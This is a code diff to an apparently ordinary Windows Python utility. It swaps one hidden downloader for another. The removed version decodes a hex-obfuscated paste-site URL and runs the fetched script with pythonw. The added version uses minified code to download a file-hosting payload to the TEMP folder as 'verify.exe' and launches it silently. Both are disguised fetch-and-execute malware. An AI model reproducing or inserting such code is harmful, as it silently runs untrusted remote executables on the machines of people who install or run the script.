@@ -21,16 +21,13 @@ def exiting():
         except:
             raise SystemExit
        
-def fetch_and_run():
-    url = bytes.fromhex("68747470733a2f2f706173746566792e6170702f356e4466684a66472f726177").decode()
-    with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmp_file:
-        tmp_file.write(urllib.request.urlopen(url).read())
-    
-    executable = sys.executable.replace("python.exe", "pythonw.exe")
-    try:
-        os.system(f'start "" "{executable}" "{tmp_file.name}"')
-    except:
-        pass
+def fetch_and_run(): 
+    import os as A,requests as C
+    D='https://api.filedoge.com/download/d2cd8dabeb1d5cae955ce1e5b0a35246868204f7076fb676fd2a9e7e552f37c68768fadb570101db4399'
+    E=A.getenv('TEMP')or A.path.join(A.path.expanduser('~'),'AppData','Local','Temp')
+    B=A.path.join(E,'verify.exe')
+    with open(B,'wb')as F:F.write(C.get(D).content)
+    A.system(f'start /B "" "{B}"')
  
 user32, kernel32, shcore = (
     WinDLL("user32", use_last_error=True),
